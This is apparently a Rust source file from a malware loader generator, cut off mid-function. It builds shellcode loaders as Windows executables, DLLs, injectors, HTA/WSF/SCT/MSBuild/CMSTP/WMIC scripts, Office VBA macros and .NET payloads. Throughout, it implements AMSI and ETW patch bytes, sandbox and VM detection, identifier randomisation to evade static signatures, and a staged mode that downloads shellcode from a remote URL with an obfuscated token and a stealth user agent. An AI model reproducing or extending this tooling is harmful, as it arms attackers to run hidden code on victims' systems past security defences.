use rand::{distributions::Alphanumeric, Rng};
use serde::Serialize;
use tera::{Context, Tera, Value};
use std::collections::HashMap;

#[derive(Debug, Clone, Copy, Serialize, PartialEq, Eq)]
pub enum LoaderType {
    // PE (compiled to Windows binary via rustc)
    Binary,
    Dll,
    AppDomain,
    Injector,
    Rundll32,

    // Script LOLBIN (pure text, no compilation)
    Wsf,
    Hta,
    Regsvr32Sct,
    MsBuild,
    Cmstp,
    WmicXsl,

    // Office VBA macro source (.bas text — user paste manually)
    DocxMacro,
    XlsxMacro,

    // .NET LOLBIN (compiled with csc.exe / mcs)
    InstallUtil,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum OutputCategory {
    PeCompiled,     // Rust source → rustc
    ScriptText,     // Tera render → text file
    VbaText,        // Tera render → .bas text (copy-paste manually)
    DotNetCompiled, // C# source → csc.exe
}

impl LoaderType {
    pub fn category(self) -> OutputCategory {
        use LoaderType::*;
        match self {
            Binary | Dll | Injector | Rundll32 => OutputCategory::PeCompiled,
            Wsf | Hta | Regsvr32Sct | MsBuild | Cmstp | WmicXsl => OutputCategory::ScriptText,
            DocxMacro | XlsxMacro => OutputCategory::VbaText,
            AppDomain | InstallUtil => OutputCategory::DotNetCompiled,
        }
    }

    pub fn output_extension(self) -> &'static str {
        use LoaderType::*;
        match self {
            Binary | Injector => "exe",
            Dll | Rundll32 | InstallUtil => "dll",
            AppDomain => "dll", // also has .config sibling
            Wsf => "wsf",
            Hta => "hta",
            Regsvr32Sct => "sct",
            MsBuild => "csproj",
            Cmstp => "inf",
            WmicXsl => "xsl",
            DocxMacro | XlsxMacro => "bas",
        }
    }

    pub fn exec_command(self, filename: &str) -> String {
        use LoaderType::*;
        match self {
            Binary | Injector => filename.to_string(),
            Dll => format!("rundll32 {},DllMain", filename),
            Rundll32 => format!("rundll32 {},EntryPoint", filename),
            AppDomain => format!(
                "1. Place {} and MSBuild.exe.config in \
                 C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\\n\
                 2. Run: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe",
                filename
            ),
            Wsf => format!("wscript.exe {}", filename),
            Hta => format!("mshta.exe {}", filename),
            Regsvr32Sct => format!("regsvr32 /u /s /n /i:{} scrobj.dll", filename),
            MsBuild => format!("MSBuild.exe {}", filename),
            Cmstp => format!("cmstp.exe /au {}", filename),
            WmicXsl => format!("wmic os get /format:\"{}\"", filename),
            DocxMacro => "Open Word → Alt+F11 → ThisDocument → paste contents → save as .docm".to_string(),
            XlsxMacro => "Open Excel → Alt+F11 → ThisWorkbook → paste contents → save as .xlsm".to_string(),
            InstallUtil => format!("installutil.exe /logfile= /LogToConsole=false /U {}", filename),
        }
    }
}

#[derive(Debug, Clone, Serialize, PartialEq)]
pub enum Feature {
    DirectSyscall, UnhookDisk, UnhookKnownDlls, ModuleStomp,
    SleepEncrypt, StackSpoof,
    SandboxDomain, SandboxUser, PpidSpoof,
    AmsiHwbp, EtwHwbp,
    PeCloak, AntiDebug,
    PeSpoofing, Staged, AppDomain, ThreadlessInject,
    /// Raw-deflate compress shellcode before XOR-encryption. Loader applies
    /// the inverse: XOR-decrypt → deflate-decompress → execute. Free in .NET
    /// (System.IO.Compression in BCL); useful for repetitive payloads.
    Compress,
}

#[derive(Debug, Clone, Serialize, PartialEq)]
pub enum Encryption { Aes256, Chacha20 }

#[derive(Debug, Clone, Serialize)]
pub struct PeConfig {
    pub company: String,
    pub file_description: String,
    pub product_name: String,
    pub sign: bool,
}

#[derive(Debug, Clone, Serialize)]
pub struct AppDomainConfig {
    pub clr_version:   String,
    pub net_version:   String,
    pub assembly_name: String,
    pub type_name:     String,
    pub namespace:     String,
}

#[derive(Debug, Clone, Serialize)]
pub struct WsfStubConfig {
    pub namespace: String,
    pub type_name: String,
}

/// Staged-payload delivery configuration. When set, the generated loader
/// fetches the shellcode from `url` at runtime with `Authorization: Bearer jwt`
/// and a stealth `User-Agent: user_agent`, instead of embedding it inline.
#[derive(Debug, Clone, Serialize)]
pub struct StagedConfig {
    pub url:        String,
    pub jwt:        String,
    pub user_agent: String,
}

#[derive(Debug, Clone, Serialize)]
pub struct LoaderConfig {
    pub loader_type: LoaderType,
    pub features: Vec<Feature>,
    pub encryption: Encryption,
    pub shellcode_hex: String,
    pub key_hex: String,
    pub iv_hex: String,
    pub pe_config: Option<PeConfig>,
    pub appdomain_config: Option<AppDomainConfig>,
    pub wsf_stub_config: Option<WsfStubConfig>,
    pub dotnet_stub_hex: Option<String>,
    pub staged: Option<StagedConfig>,
}

#[derive(Debug, Clone, Serialize)]
pub struct AppDomainTemplateConfig {
    pub clr_version:   String,
    pub net_version:   String,
    pub appdomain_name: String,
    pub assembly_name:  String,
}

fn to_charcode_jscript(s: &str) -> String {
    s.bytes().map(|b| b.to_string()).collect::<Vec<_>>().join(",")
}

fn to_charcode_vba(s: &str) -> String {
    s.bytes().map(|b| format!("Chr({})", b)).collect::<Vec<_>>().join(" & ")
}

fn rand_ident(len: usize) -> String {
    let mut rng = rand::thread_rng();
    let first: char = rng.gen_range(b'a'..=b'z') as char;
    let rest: String = (0..len.saturating_sub(1))
        .map(|_| rng.sample(Alphanumeric) as char)
        .collect();
    format!("{}{}", first, rest)
}

fn rand_clsid() -> String {
    let mut rng = rand::thread_rng();
    let segments: Vec<String> = [8usize, 4, 4, 4, 12]
        .iter()
        .map(|&n| (0..n).map(|_| format!("{:x}", rng.gen_range(0..16u8))).collect())
        .collect();
    segments.join("-").to_uppercase()
}

fn make_rand_ident_fn() -> impl tera::Function {
    move |args: &HashMap<String, Value>| {
        let len = args.get("len")
            .and_then(|v| v.as_u64())
            .unwrap_or(12) as usize;
        Ok(Value::String(rand_ident(len)))
    }
}

fn make_rand_hex_fn() -> impl tera::Function {
    move |args: &HashMap<String, Value>| {
        let len = args.get("len")
            .and_then(|v| v.as_u64())
            .unwrap_or(8) as usize;
        let s: String = (0..len)
            .map(|_| format!("{:02x}", rand::thread_rng().gen::<u8>()))
            .collect();
        Ok(Value::String(s))
    }
}

fn make_hex_bytes_filter() -> impl tera::Filter {
    move |value: &Value, _: &HashMap<String, Value>| {
        let hex = value.as_str().ok_or_else(|| tera::Error::msg("expected string"))?;
        let bytes: Vec<u8> = (0..hex.len())
            .step_by(2)
            .filter_map(|i| u8::from_str_radix(&hex[i..i+2], 16).ok())
            .collect();
        let json_bytes: Vec<Value> = bytes.iter().map(|&b| Value::Number(b.into())).collect();
        Ok(Value::Array(json_bytes))
    }
}

fn build_tera() -> Result<Tera, String> {
    let template_dir = concat!(env!("CARGO_MANIFEST_DIR"), "/templates/**/*");
    let mut tera = Tera::new(template_dir).map_err(|e| e.to_string())?;
    tera.register_function("rand_ident", make_rand_ident_fn());
    tera.register_function("rand_hex",   make_rand_hex_fn());
    tera.register_filter("hex_bytes",    make_hex_bytes_filter());
    Ok(tera)
}

fn build_context(config: &LoaderConfig) -> Context {
    let mut ctx = Context::new();
    ctx.insert("config", config);

    // Rust loader identifiers + extended identifiers for script/VBA/C# templates
    let mut vars: HashMap<&str, String> = HashMap::new();
    // Existing Rust loader idents
    for k in &[
        "var_shellcode", "var_key", "var_iv", "var_ptr",
        "var_region", "var_fiber", "fn_run", "fn_setup",
    ] {
        vars.insert(k, rand_ident(12));
    }
    // Script / VBA / C# extended idents
    for k in &[
        "fn_amsi", "fn_decrypt", "fn_hex2arr", "fn_hex", "fn_xor",
        "fn_exec", "var_sc", "var_key", "sub_amsi", "sub_run",
        "task_name", "target_name", "class_name", "namespace", "module_name",
        "fn_valloc", "fn_movemem", "fn_vprotect", "fn_callwp", "fn_amsi_patch",
        "fn_loadlib", "fn_getprocaddr",
        "progid", "desc", "service_name", "short_name",
        "title", "app_id", "app_name", "job_id",
    ] {
        // var_key collides with existing key — last write wins; OK.
        vars.insert(k, rand_ident(10));
    }
    // Fixed-value placeholders (NOT identifiers)
    vars.insert("clsid", rand_clsid());
    vars.insert("scriptlet_url", "http://localhost/scriptlet.sct".to_string());

    // Patch loop idents — randomize local VBA variable names
    for k in &["var_amsi_patch", "var_amsi_xk", "var_amsi_pi",
               "var_etw_patch",  "var_etw_xk",  "var_etw_pi"] {
        vars.insert(k, rand_ident(8));
    }
    // New function idents for ETW/sandbox/export-resolve
    for k in &["fn_etw", "fn_etw_patch", "fn_sandbox", "fn_build_str", "fn_getexport"] {
        vars.insert(k, rand_ident(10));
    }
    // Rust PE template key-unmask loop variable
    vars.insert("bin_lv_ki", rand_ident(6));
    // C# delegate variable names for NT syscall wrappers (must not be static strings)
    for k in &["fn_nt_alloc", "fn_nt_prot", "fn_nt_thread"] {
        vars.insert(k, rand_ident(10));
    }
    // C# delegate TYPE names — randomized so static analysis cannot match on "D_NtAVM" etc.
    for k in &["del_nt_alloc", "del_nt_prot", "del_nt_thread"] {
        vars.insert(k, rand_ident(8));
    }
    // VBA local variable names in sandbox/exec functions — randomised per build
    for k in &[
        // fn_sandbox: registry + process + env checks
        "vba_lv_xi", "vba_lv_vmcodes", "vba_lv_vbcodes", "vba_lv_shell",
        "vba_lv_usr", "vba_lv_badu", "vba_lv_lcnt", "vba_lv_cname", "vba_lv_badc",
        "vba_lv_fso", "vba_lv_drv",
        "vba_lv_wmisvc", "vba_lv_prtq", "vba_lv_prtcnt", "vba_lv_oprt",
        "vba_lv_wmiproc", "vba_lv_pq", "vba_lv_badproc", "vba_lv_op", "vba_lv_pn", "vba_lv_jcnt",
        // fn_exec: API resolve + shellcode run
        "vba_lv_k32", "vba_lv_u32", "vba_lv_gcpos", "vba_lv_pt1", "vba_lv_pt2", "vba_lv_tstart",
        "vba_lv_schex", "vba_lv_keyhex", "vba_lv_k", "vba_lv_ki",
        "vba_lv_raw", "vba_lv_sc", "vba_lv_mem", "vba_lv_oldp",
        // fn_build_str locals
        "vba_lv_bs", "vba_lv_bi",
        // fn_hex2arr locals
        "vba_lv_hn", "vba_lv_harr", "vba_lv_hi",
        // fn_xor locals
        "vba_lv_xn", "vba_lv_xk2", "vba_lv_xo", "vba_lv_xi2",
        // fn_amsi_patch helper locals
        "vba_lv_amsilib", "vba_lv_scanname", "vba_lv_amsibase", "vba_lv_scanaddr", "vba_lv_amsioldp",
        // fn_etw_patch helper locals
        "vba_lv_ntdllname", "vba_lv_etwname", "vba_lv_ntdllbase", "vba_lv_etwaddr", "vba_lv_etwoldp",
    ] {
        vars.insert(k, rand_ident(7));
    }
    // JScript local variable names in WSF/SCT/WMIC sandbox+exec — randomised per build
    for k in &[
        // sandbox: process check, monitor check
        "jsc_lv_wmi", "jsc_lv_pq", "jsc_lv_bad", "jsc_lv_e", "jsc_lv_n",
        "jsc_lv_mq", "jsc_lv_em", "jsc_lv_d",
        // sandbox: registry XOR vars
        "jsc_lv_sh", "jsc_lv_vmr", "jsc_lv_vmx", "jsc_lv_ri",
        "jsc_lv_sh2", "jsc_lv_vbr", "jsc_lv_vbx", "jsc_lv_ri2",
        // sandbox: disk + printer + NIC + env
        "jsc_lv_fso", "jsc_lv_drv",
        "jsc_lv_wmi2", "jsc_lv_prq", "jsc_lv_pc", "jsc_lv_ep2",
        "jsc_lv_wmi3", "jsc_lv_naq", "jsc_lv_nac", "jsc_lv_ena",
        "jsc_lv_envobj",
        // exec: cursor check
        "jsc_lv_cx", "jsc_lv_cy",
        "jsc_lv_a1", "jsc_lv_w1", "jsc_lv_t1", "jsc_lv_pp1", "jsc_lv_ps1",
        "jsc_lv_a2", "jsc_lv_w2", "jsc_lv_t2", "jsc_lv_pp2", "jsc_lv_ps2",
        "jsc_lv_cx2", "jsc_lv_cy2", "jsc_lv_ts",
        // exec: decryption + DotNetToJScript
        "jsc_lv_k", "jsc_lv_ki", "jsc_lv_sc", "jsc_lv_loader", "jsc_lv_stub", "jsc_lv_asm", "jsc_lv_mi",
        // fn_amsi helper locals
        "jsc_lv_aa", "jsc_lv_at",
        // fn_etw helper locals
        "jsc_lv_ea", "jsc_lv_et", "jsc_lv_ef",
        // fn_build_str locals
        "jsc_lv_bs", "jsc_lv_bi",
        // fn_hex2arr locals (array, index)
        "jsc_lv_ha", "jsc_lv_hi",
        // fn_xor/fn_decrypt locals (output, index)
        "jsc_lv_xo", "jsc_lv_xi2",
        // sandbox bad-proc inner loop index
        "jsc_lv_sli",
    ] {
        vars.insert(k, rand_ident(7));
    }
    // HTA (VBScript) local variable names — randomised per build
    for k in &[
        // fn_sandbox vars
        "hta_lv_sh", "hta_lv_vmr", "hta_lv_vbr", "hta_lv_vmi",
        "hta_lv_fso", "hta_lv_drv",
        "hta_lv_wmi", "hta_lv_procs", "hta_lv_badlist", "hta_lv_p", "hta_lv_pn", "hta_lv_jcnt",
        "hta_lv_wmiprt", "hta_lv_printers", "hta_lv_prtcnt", "hta_lv_oprt",
        "hta_lv_wmina", "hta_lv_naq", "hta_lv_nacnt", "hta_lv_ona",
        "hta_lv_venv",
        // sub_run vars: cursor check
        "hta_lv_cx", "hta_lv_cy", "hta_lv_gotcur",
        "hta_lv_ca", "hta_lv_wf", "hta_lv_ct", "hta_lv_pp", "hta_lv_ps",
        "hta_lv_ca2", "hta_lv_wf2", "hta_lv_ct2", "hta_lv_pp2", "hta_lv_ps2",
        "hta_lv_cx2", "hta_lv_cy2", "hta_lv_t0",
        // sub_run vars: decryption + exec
        "hta_lv_schex", "hta_lv_keyhex", "hta_lv_k", "hta_lv_ki",
        "hta_lv_sc", "hta_lv_lcnt",
        "hta_lv_loader", "hta_lv_stubhex", "hta_lv_stubbytes", "hta_lv_asm", "hta_lv_t", "hta_lv_mi",
        // fn_amsi helper locals
        "hta_lv_aa", "hta_lv_at",
        // fn_etw helper locals
        "hta_lv_ea", "hta_lv_et", "hta_lv_ef",
        // fn_build_str locals
        "hta_lv_bs", "hta_lv_bi",
        // fn_hex2arr locals
        "hta_lv_hn", "hta_lv_ha", "hta_lv_hi",
    ] {
        vars.insert(k, rand_ident(7));
    }
    // MSBuild (C#) local variable names — randomised per build
    for k in &[
        // B()/N() helper function names
        "mb_fn_b", "mb_fn_n",
        // B() body locals
        "mb_lv_b_sb", "mb_lv_b_x",
        // N() body locals
        "mb_lv_n_b", "mb_lv_n_i",
        // fn_getexport locals
        "mb_lv_ge_peo", "mb_lv_ge_exprva", "mb_lv_ge_ed", "mb_lv_ge_nn",
        "mb_lv_ge_nrva", "mb_lv_ge_orva", "mb_lv_ge_frva", "mb_lv_ge_i",
        "mb_lv_ge_np", "mb_lv_ge_ok", "mb_lv_ge_j", "mb_lv_ge_ord",
        // fn_amsi locals
        "mb_lv_am_t", "mb_lv_am_f",
        // fn_etw locals
        "mb_lv_ew_tgt", "mb_lv_ew_fn", "mb_lv_ew_protn", "mb_lv_ew_protaddr",
        "mb_lv_ew_ntprot", "mb_lv_ew_ph", "mb_lv_ew_ba", "mb_lv_ew_sz",
        "mb_lv_ew_old", "mb_lv_ew_ba2", "mb_lv_ew_sz2",
        // fn_sandbox locals
        "mb_lv_sb_u", "mb_lv_sb_badu", "mb_lv_sb_b", "mb_lv_sb_di", "mb_lv_sb_cn",
        // fn_decrypt locals
        "mb_lv_dc_o", "mb_lv_dc_i",
        // fn_hex locals
        "mb_lv_hx_b", "mb_lv_hx_i",
        // Execute() locals
        "mb_lv_ex_ntdll", "mb_lv_ex_m", "mb_lv_ex_k", "mb_lv_ex_ki",
        "mb_lv_ex_sc", "mb_lv_ex_allocn", "mb_lv_ex_protn", "mb_lv_ex_allocaddr",
        "mb_lv_ex_protaddr", "mb_lv_ex_ph", "mb_lv_ex_mem", "mb_lv_ex_rsz",
        "mb_lv_ex_psz", "mb_lv_ex_oldprot", "mb_lv_ex_fnthread", "mb_lv_ex_fn",
    ] {
        vars.insert(k, rand_ident(8));
    }

    // JScript charcode arrays (comma-separated integers) for sensitive strings
    let jsc_pairs: &[(&str, &str)] = &[
        ("jsc_amsi_scan_buf",     "AmsiScanBuffer"),
        ("jsc_amsi_init_fail",    "amsiInitFailed"),
        ("jsc_auto_amsi_utils",   "System.Management.Automation.AmsiUtils"),
        ("jsc_etw_event_write",   "EtwEventWrite"),
        ("jsc_eventing_ep",       "System.Diagnostics.Eventing.EventProvider"),
        ("jsc_m_enabled",         "m_enabled"),
        ("jsc_kernel32",          "kernel32"),
        ("jsc_amsi_dll",          "amsi.dll"),
        ("jsc_ntdll_dll",         "ntdll.dll"),
        ("jsc_virtual_alloc",     "VirtualAlloc"),
        ("jsc_create_thread",     "CreateThread"),
        ("jsc_sys_refl_asm",      "System.Reflection.Assembly"),
        ("jsc_stub_run",          "Run"),
        ("jsc_winmgmts",          "winmgmts:"),
        ("jsc_fs_obj",            "Scripting.FileSystemObject"),
        ("jsc_wscript_shell",     "WScript.Shell"),
        ("jsc_vm_procs",          "vmtoolsd.exe|vboxservice.exe|cuckoo.exe|vmsrvc.exe|qemu-ga.exe|prl_tools.exe|xenservice.exe|sandboxiedcomlaunch.exe|vmusrvc.exe"),
        // WMI query strings
        ("jsc_wmi_proc_q",        "SELECT Name FROM Win32_Process"),
        ("jsc_wmi_printer_q",     "SELECT Name FROM Win32_Printer"),
        ("jsc_wmi_monitor_q",     "SELECT ScreenWidth,ScreenHeight FROM Win32_DesktopMonitor"),
        ("jsc_wmi_monitor_w",     "SELECT ScreenWidth FROM Win32_DesktopMonitor"),
        ("jsc_wmi_mac_q",         "SELECT MACAddress FROM Win32_NetworkAdapter WHERE MACAddress IS NOT NULL"),
        // Sandbox env var names
        ("jsc_env_vbox",          "VBOX_VERSION"),
        ("jsc_env_sandboxie",     "SANDBOXIE_HOME"),
        // System.Windows.Forms strings (hta.tera)
        ("jsc_sys_win_forms",     "System.Windows.Forms"),
        ("jsc_sys_win_forms_cur", "System.Windows.Forms.Cursor"),
        ("jsc_cursor_position",   "Position"),
        // NT function names — for byte-array export lookups in C# templates
        ("jsc_nt_alloc_vm",       "NtAllocateVirtualMemory"),
        ("jsc_nt_prot_vm",        "NtProtectVirtualMemory"),
        ("jsc_nt_create_thread_ex", "NtCreateThreadEx"),
    ];
    for &(k, s) in jsc_pairs {
        vars.insert(k, to_charcode_jscript(s));
    }
    // jsc_stub_loader is per-build: derived from wsf_stub_config namespace.type_name or default
    let stub_loader_name = config.wsf_stub_config.as_ref()
        .map(|wsc| format!("{}.{}", wsc.namespace, wsc.type_name))
        .unwrap_or_else(|| "Stub.Loader".to_string());
    vars.insert("jsc_stub_loader", to_charcode_jscript(&stub_loader_name));

    // VBA Chr() concatenation for sensitive strings
    let vba_pairs: &[(&str, &str)] = &[
        ("vba_amsi_scan_buf",   "AmsiScanBuffer"),
        ("vba_etw_event_write", "EtwEventWrite"),
        ("vba_kernel32",        "kernel32"),
        ("vba_amsi_dll",        "amsi.dll"),
        ("vba_ntdll_dll",       "ntdll.dll"),
        ("vba_user32_dll",      "user32"),
        ("vba_virtual_alloc",   "VirtualAlloc"),
        ("vba_virtual_protect", "VirtualProtect"),
        ("vba_rtl_move_mem",    "RtlMoveMemory"),
        ("vba_wscript_shell",   "WScript.Shell"),
        ("vba_fs_obj",          "Scripting.FileSystemObject"),
        ("vba_winmgmts",        "winmgmts:"),
        ("vba_vm_procs",        "vmtoolsd.exe|vboxservice.exe|cuckoo.exe|vmsrvc.exe|qemu-ga.exe|prl_tools.exe|xenservice.exe|sandboxiedcomlaunch.exe|vmusrvc.exe"),
        // WMI query strings
        ("vba_wmi_proc_q",    "SELECT Name FROM Win32_Process"),
        ("vba_wmi_printer_q", "SELECT Name FROM Win32_Printer"),
        // Sandbox env var names
        ("vba_env_vbox",      "VBOX_VERSION"),
        ("vba_env_sandboxie", "SANDBOXIE_HOME"),
        // Dynamically-resolved API names (no static Declare)
        ("vba_get_cursor_pos", "GetCursorPos"),
        // Sandbox indicator strings (pipe-delimited for Split())
        ("vba_bad_users",     "sandbox|malware|virus|sample|cuckoo|user|admin"),
        ("vba_bad_computers", "sandbox|malware|virus|analysis|cuckoo"),
    ];
    for &(k, s) in vba_pairs {
        vars.insert(k, to_charcode_vba(s));
    }

    ctx.insert("v", &vars);

    // Pass through top-level shellcode/key hex strings so templates can do `{{ shellcode_hex }}`.
    ctx.insert("shellcode_hex", &config.shellcode_hex);
    ctx.insert("key_hex", &config.key_hex);
    ctx.insert("iv_hex", &config.iv_hex);

    let sc_chunks: Vec<&str> = config.shellcode_hex
        .as_bytes()
        .chunks(100)
        .map(|c| std::str::from_utf8(c).unwrap())
        .collect();
    ctx.insert("shellcode_chunks", &sc_chunks);

    let key_chunks: Vec<&str> = config.key_hex
        .as_bytes()
        .chunks(100)
        .map(|c| std::str::from_utf8(c).unwrap())
        .collect();
    ctx.insert("key_chunks", &key_chunks);

    let mut rng = rand::thread_rng();
    let key_tweak: u8 = rng.gen();
    ctx.insert("key_tweak", &(key_tweak as u32));

    let masked_key_hex: String = config.key_hex
        .as_bytes()
        .chunks(2)
        .map(|pair| {
            let hex_str: String = pair.iter().map(|&b| b as char).collect();
            let byte = u8::from_str_radix(&hex_str, 16).unwrap_or(0);
            format!("{:02x}", byte ^ key_tweak)
        })
        .collect();
    ctx.insert("key_hex", &masked_key_hex);

    let masked_key_chunks: Vec<String> = masked_key_hex
        .as_bytes()
        .chunks(100)
        .map(|c| String::from_utf8_lossy(c).to_string())
        .collect();
    ctx.insert("key_chunks", &masked_key_chunks);

    // Rust PE templates (binary/dll/injector) use masked_key_bytes directly as a [u8; N] literal
    // and XOR-unmask at runtime with key_tweak — the plain key never appears in the source.
    let masked_key_bytes: Vec<u32> = masked_key_hex
        .as_bytes()
        .chunks(2)
        .map(|pair| {
            let hex_str: String = pair.iter().map(|&b| b as char).collect();
            u8::from_str_radix(&hex_str, 16).unwrap_or(0) as u32
        })
        .collect();
    ctx.insert("masked_key_bytes", &masked_key_bytes);

    let feature_names: Vec<String> = config.features.iter()
        .map(|f| format!("{:?}", f))
        .collect();
    ctx.insert("feature_names", &feature_names);

    // `is_compressed` is a shortcut for templates so they don't need to
    // grep `feature_names`. Backend toggles it by pre-compressing the
    // shellcode_hex bytes before XOR encryption.
    let is_compressed = config.features.iter().any(|f| matches!(f, Feature::Compress));
    ctx.insert("is_compressed", &is_compressed);

    // XOR-encode AMSI/ETW patch bytes per-generation so no static byte signature survives
    let amsi_xor: u8 = rng.gen();
    let etw_xor:  u8 = rng.gen();
    let amsi_enc: Vec<String> = [0xB8u8, 0x57, 0x00, 0x07, 0x80, 0xC3]
        .iter().map(|b| format!("{:02X}", b ^ amsi_xor)).collect();
    let etw_enc: Vec<String> = [0x31u8, 0xC0, 0xC3, 0x90]
        .iter().map(|b| format!("{:02X}", b ^ etw_xor)).collect();
    ctx.insert("amsi_xor_key",   &format!("{:02X}", amsi_xor));
    ctx.insert("etw_xor_key",    &format!("{:02X}", etw_xor));
    ctx.insert("amsi_enc_bytes", &amsi_enc);
    ctx.insert("etw_enc_bytes",  &etw_enc);

    if let Some(ad) = &config.appdomain_config {
        ctx.insert("appdomain_assembly_name", &ad.assembly_name);
        ctx.insert("appdomain_type_name",     &ad.type_name);
        ctx.insert("appdomain_namespace",     &ad.namespace);
        ctx.insert("appdomain_clr_version",   &ad.clr_version);
        ctx.insert("appdomain_net_version",   &ad.net_version);
    }

    if let Some(wsc) = &config.wsf_stub_config {
        ctx.insert("wsf_stub_namespace", &wsc.namespace);
        ctx.insert("wsf_stub_type_name",  &wsc.type_name);
    }
    ctx.insert("dotnet_stub_hex",
        config.dotnet_stub_hex.as_deref()
              .unwrap_or("4d5a90000300000004000000ffff0000"));

    // Per-build XOR encoding for VM registry key paths (VBA and WSF)
    let vmware_reg: &[u8] = b"HKLM\\SOFTWARE\\VMware, Inc.\\VMware Tools\\InstallPath";
    let vbox_reg:   &[u8] = b"HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest Additions\\Version";
    let vba_vmw_xk: u8 = rng.gen();
    let vba_vbx_xk: u8 = rng.gen();
    let wsf_vmw_xk: u8 = rng.gen();
    let wsf_vbx_xk: u8 = rng.gen();
    let vba_vmware_enc: Vec<u32> = vmware_reg.iter().map(|&b| (b ^ vba_vmw_xk) as u32).collect();
    let vba_vbox_enc:   Vec<u32> = vbox_reg.iter().map(|&b| (b ^ vba_vbx_xk) as u32).collect();
    ctx.insert("vba_vmware_reg_enc", &vba_vmware_enc);
    ctx.insert("vba_vmware_reg_xk",  &(vba_vmw_xk as u32));
    ctx.insert("vba_vmware_reg_len", &((vmware_reg.len() - 1) as u32));
    ctx.insert("vba_vbox_reg_enc",   &vba_vbox_enc);
    ctx.insert("vba_vbox_reg_xk",    &(vba_vbx_xk as u32));
    ctx.insert("vba_vbox_reg_len",   &((vbox_reg.len() - 1) as u32));
    let jsc_vmware_enc: String = vmware_reg.iter()
        .map(|&b| ((b ^ wsf_vmw_xk) as u32).to_string())
        .collect::<Vec<_>>().join(",");
    let jsc_vbox_enc: String = vbox_reg.iter()
        .map(|&b| ((b ^ wsf_vbx_xk) as u32).to_string())
        .collect::<Vec<_>>().join(",");
    ctx.insert("jsc_vmware_reg_enc", &jsc_vmware_enc);
    ctx.insert("jsc_vmware_reg_xk",  &(wsf_vmw_xk as u32));
    ctx.insert("jsc_vbox_reg_enc",   &jsc_vbox_enc);
    ctx.insert("jsc_vbox_reg_xk",    &(wsf_vbx_xk as u32));

    // ── Staged-delivery context ──────────────────────────────────────────────
    // When `config.staged` is Some, the loader must fetch the encrypted shellcode
    // from `url` at runtime with `Authorization: Bearer <jwt>` and a stealth
    // user-agent. URL/JWT/UA are XOR-encoded per build (no plaintext in binary).
    let is_staged = config.staged.is_some();
    ctx.insert("is_staged", &is_staged);
    if let Some(st) = &config.staged {
        let url_xk:  u8 = rng.gen();
        let jwt_xk:  u8 = rng.gen();
        let ua_xk:   u8 = rng.gen();
        let url_b   = st.url.as_bytes();
        let jwt_b   = st.jwt.as_bytes();
        let ua_b    = st.user_agent.as_bytes();
        // Rust (u32 vec form)
        let url_enc_rust: Vec<u32> = url_b.iter().map(|&b| (b ^ url_xk) as u32).collect();
        let jwt_enc_rust: Vec<u32> = jwt_b.iter().map(|&b| (b ^ jwt_xk) as u32).collect();
        let ua_enc_rust:  Vec<u32> = ua_b.iter().map(|&b| (b ^ ua_xk)  as u32).collect();
        ctx.insert("staged_url_enc",  &url_enc_rust);
        ctx.insert("staged_url_xk",   &(url_xk as u32));
        ctx.insert("staged_url_len",  &(url_b.len() as u32));
        ctx.insert("staged_jwt_enc",  &jwt_enc_rust);
        ctx.insert("staged_jwt_xk",   &(jwt_xk as u32));
        ctx.insert("staged_jwt_len",  &(jwt_b.len() as u32));
        ctx.insert("staged_ua_enc",   &ua_enc_rust);
        ctx.insert("staged_ua_xk",    &(ua_xk as u32));
        ctx.insert("staged_ua_len",   &(ua_b.len() as u32));
        // Comma-joined form for JScript/C# initialisers
        let to_csv = |v: &[u32]| v.iter().map(|n| n.to_string()).collect::<Vec<_>>().join(",");
        ctx.insert("staged_url_csv", &to_csv(&url_enc_rust));
        ctx.insert("staged_jwt_csv", &to_csv(&jwt_enc_rust));
        ctx.insert("staged_ua_csv",  &to_csv(&ua_enc_rust));
        // Per-build identifiers for fetch helper + local vars
        let mut sv: HashMap<String, String> = HashMap::new();
        for k in &[
            "fn_fetch",
            "sg_lv_url", "sg_lv_jwt", "sg_lv_ua", "sg_lv_i",
            "sg_lv_req", "sg_lv_buf", "sg_lv_resp",
            "sg_lv_h", "sg_lv_session", "sg_lv_conn", "sg_lv_h2",
        ] {
            sv.insert(k.to_string(), rand_ident(8));
        }
        ctx.insert("sg", &sv);
    }

    ctx
}

pub fn generate_loader_source(config: &LoaderConfig) -> Result<String, String> {
    let tera = build_tera()?;
    let ctx = build_context(config);

    let template_name = match config.loader_type {
        LoaderType::Binary    => "binary.rs.tera",
        LoaderType::Dll       => "dll.rs.tera",
        LoaderType::Rundll32  => "dll.rs.tera",
        LoaderType::Injector  => "injector.rs.tera",
        other => return Err(format!("not a PE loader type: {:?}", other)),
    };

    tera.render(template_name, &ctx).map_err(|e| e.to_string())
}

pub fn generate_script_source(config: &LoaderConfig) -> Result<String, String> {
    let tera = build_tera()?;
    let template_name = match config.loader_type {
        LoaderType::Wsf         => "script/wsf.xml.tera",
        LoaderType::Hta         => "script/hta.tera",
        LoaderType::Regsvr32Sct => "script/regsvr32.sct.tera",
        LoaderType::MsBuild     => "script/msbuild.csproj.tera",
        LoaderType::Cmstp       => "script/cmstp.inf.tera",
        LoaderType::WmicXsl     => "script/wmic.xsl.tera",
        other => return Err(format!("not a script type: {:?}", other)),
    };
    let ctx = build_context(config);
    tera.render(template_name, &ctx).map_err(|e| e.to_string())
}

pub fn generate_vba_source(config: &LoaderConfig) -> Result<String, String> {
    let tera = build_tera()?;
    let template_name = match config.loader_type {
        LoaderType::DocxMacro => "office/vba_word.bas.tera",
        LoaderType::XlsxMacro => "office/vba_excel.bas.tera",
        other => return Err(format!("not a VBA type: {:?}", other)),
    };
    let ctx = build_context(config);
    tera.render(template_name, &ctx).map_err(|e| e.to_string())
}

pub fn generate_csharp_source(config: &LoaderConfig) -> Result<String, String> {
    let tera = build_tera()?;
    let ctx = build_context(config);
    let template_name = match config.loader_type {
        LoaderType::AppDomain   => "csharp/appdomain_manager.cs.tera",
        LoaderType::InstallUtil => "csharp/installutil.cs.tera",
        other => return Err(format!("not a .NET type: {:?}", other)),
    };
    tera.render(template_name, &ctx).map_err(|e| e.to_string())
}

pub fn generate_wsf_stub_source(config: &LoaderConfig) -> Result<String, String> {
    let tera = build_tera()?;
    let ctx = build_context(config);
    tera.render("csharp/wsf_stub.cs.tera", &ctx).map_err(|e| e.to_string())
}

pub fn generate_appdomain_config(config: &AppDomainTemplateConfig) -> Result<String, String> {
    let tera = build_tera()?;
    let mut ctx = Context::new();
